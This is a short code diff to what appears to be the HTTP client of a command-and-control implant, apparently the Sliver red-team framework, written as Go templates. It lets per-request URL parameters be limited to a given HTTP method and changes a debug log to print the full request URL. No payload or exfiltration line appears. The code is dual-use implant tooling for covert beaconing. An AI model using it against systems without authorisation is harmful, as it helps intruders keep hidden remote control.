@@ -273,11 +273,19 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 
 	extraURLParams := []nameValueProbability{
 		// {{range $param := .HTTPC2ImplantConfig.ExtraURLParameters}}
-		{Name: "{{$param.Name}}", Value: "{{$param.Value}}", Probability: "{{$param.Probability}}"},
+		{
+			Name:        "{{$param.Name}}",
+			Value:       "{{$param.Value}}",
+			Probability: "{{$param.Probability}}",
+			Method:      "{{$param.Method}}",
+		},
 		// {{end}}
 	}
 	queryParams := req.URL.Query()
 	for _, param := range extraURLParams {
+		if len(param.Method)>0 && param.Method != method {
+			continue
+		}
 		probability, _ := strconv.Atoi(param.Probability)
 		if 0 < probability {
 			roll := insecureRand.Intn(99) + 1
@@ -426,7 +434,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
 	// {{if .Config.Debug}}
-	log.Printf("[http] GET -> %s", uri)
+	log.Printf("[http] GET -> %s", req.URL)
 	// {{end}}
 	resp, rawRespData, err := s.DoPoll(req)
 	if err != nil {
